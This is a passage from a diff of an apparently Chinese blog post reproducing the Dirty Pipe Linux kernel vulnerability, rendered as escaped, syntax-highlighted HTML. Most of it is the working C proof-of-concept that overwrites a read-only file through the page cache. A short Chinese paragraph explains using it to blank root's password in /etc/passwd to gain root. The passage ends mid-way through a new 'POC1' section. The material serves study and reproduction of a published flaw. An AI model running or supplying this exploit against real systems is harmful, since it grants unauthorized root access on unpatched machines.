-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4096&lt;/span>&lt;span class="p">];&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* fill the pipe completely; each pipe_buffer will now have
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> the PIPE_BUF_FLAG_CAN_MERGE flag */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pipe_size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span> &lt;span class="o">-=&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* drain the pipe, freeing all pipe_buffer instances (but
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> leaving the flags initialized) */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pipe_size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span> &lt;span class="o">-=&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* the pipe is now empty, and if somebody adds a new
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> pipe_buffer without initializing its &amp;#34;flags&amp;#34;, the buffer
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> will be mergeable */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Usage: %s TARGETFILE OFFSET DATA&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* dumb command-line argument parser */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">loff_t&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strtoul&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">data_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Sorry, cannot start writing at a page boundary&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="n">loff_t&lt;/span> &lt;span class="n">next_page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="n">loff_t&lt;/span> &lt;span class="n">end_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">loff_t&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">data_size&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">end_offset&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">next_page&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Sorry, cannot write across a page boundary&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* open the input file and validate the specified offset */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// yes, read-only! :-)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">perror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;open failed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="nc">stat&lt;/span> &lt;span class="n">st&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fstat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">st&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">perror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;stat failed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">st&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">st_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Offset is not inside the file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">end_offset&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">st&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">st_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Sorry, cannot enlarge the file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* create the pipe with all flags initialized with
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> PIPE_BUF_FLAG_CAN_MERGE */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prepare_pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* splice one byte from before the specified offset into the
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> pipe; this will add a reference to the page cache, but
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> since copy_page_to_iter_pipe() does not initialize the
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> &amp;#34;flags&amp;#34;, PIPE_BUF_FLAG_CAN_MERGE is still set */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">--&lt;/span>&lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nbytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">splice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">offset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nbytes&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">perror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;splice failed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nbytes&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;short splice&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* the following write will not create a new pipe_buffer, but
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> will instead write into the page cache, because of the
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> PIPE_BUF_FLAG_CAN_MERGE flag */&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nbytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data_size&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nbytes&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">perror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;write failed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">nbytes&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">data_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;short write&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;It worked!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>这个poc比较粗糙，需要指定覆盖哪个文件，从第几个字符开始写，写入什么内容，因此我们可以将passwd中root的密码置空，然后再在描述处填充字符，达到提权的目的。&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576.png"
+&gt;&lt;/p&gt;
+&lt;h2 id="poc1"&gt;POC1
+&lt;/h2&gt;&lt;p&gt;第一个是作者自己发表的：&lt;a class="link" href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener"
+&gt;The Dirty Pipe Vulnerability&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt; 10
+&lt;/span&gt;&lt;span class="lnt"&gt; 11
+&lt;/span&gt;&lt;span class="lnt"&gt; 12
+&lt;/span&gt;&lt;span class="lnt"&gt; 13
+&lt;/span&gt;&lt;span class="lnt"&gt; 14
+&lt;/span&gt;&lt;span class="lnt"&gt; 15
+&lt;/span&gt;&lt;span class="lnt"&gt; 16
+&lt;/span&gt;&lt;span class="lnt"&gt; 17
+&lt;/span&gt;&lt;span class="lnt"&gt; 18
+&lt;/span&gt;&lt;span class="lnt"&gt; 19
+&lt;/span&gt;&lt;span class="lnt"&gt; 20
+&lt;/span&gt;&lt;span class="lnt"&gt; 21
+&lt;/span&gt;&lt;span class="lnt"&gt; 22
+&lt;/span&gt;&lt;span class="lnt"&gt; 23
+&lt;/span&gt;&lt;span class="lnt"&gt; 24
+&lt;/span&gt;&lt;span class="lnt"&gt; 25
+&lt;/span&gt;&lt;span class="lnt"&gt; 26
+&lt;/span&gt;&lt;span class="lnt"&gt; 27
+&lt;/span&gt;&lt;span class="lnt"&gt; 28
+&lt;/span&gt;&lt;span class="lnt"&gt; 29
+&lt;/span&gt;&lt;span class="lnt"&gt; 30
+&lt;/span&gt;&lt;span class="lnt"&gt; 31
+&lt;/span&gt;&lt;span class="lnt"&gt; 32
+&lt;/span&gt;&lt;span class="lnt"&gt; 33
+&lt;/span&gt;&lt;span class="lnt"&gt; 34
+&lt;/span&gt;&lt;span class="lnt"&gt; 35
+&lt;/span&gt;&lt;span class="lnt"&gt; 36
+&lt;/span&gt;&lt;span class="lnt"&gt; 37
+&lt;/span&gt;&lt;span class="lnt"&gt; 38
+&lt;/span&gt;&lt;span class="lnt"&gt; 39
+&lt;/span&gt;&lt;span class="lnt"&gt; 40
+&lt;/span&gt;&lt;span class="lnt"&gt; 41
+&lt;/span&gt;&lt;span class="lnt"&gt; 42
+&lt;/span&gt;&lt;span class="lnt"&gt; 43
+&lt;/span&gt;&lt;span class="lnt"&gt; 44
+&lt;/span&gt;&lt;span class="lnt"&gt; 45
+&lt;/span&gt;&lt;span class="lnt"&gt; 46
+&lt;/span&gt;&lt;span class="lnt"&gt; 47
+&lt;/span&gt;&lt;span class="lnt"&gt; 48
+&lt;/span&gt;&lt;span class="lnt"&gt; 49
+&lt;/span&gt;&lt;span class="lnt"&gt; 50
+&lt;/span&gt;&lt;span class="lnt"&gt; 51
+&lt;/span&gt;&lt;span class="lnt"&gt; 52
+&lt;/span&gt;&lt;span class="lnt"&gt; 53
+&lt;/span&gt;&lt;span class="lnt"&gt; 54
+&lt;/span&gt;&lt;span class="lnt"&gt; 55
+&lt;/span&gt;&lt;span class="lnt"&gt; 56
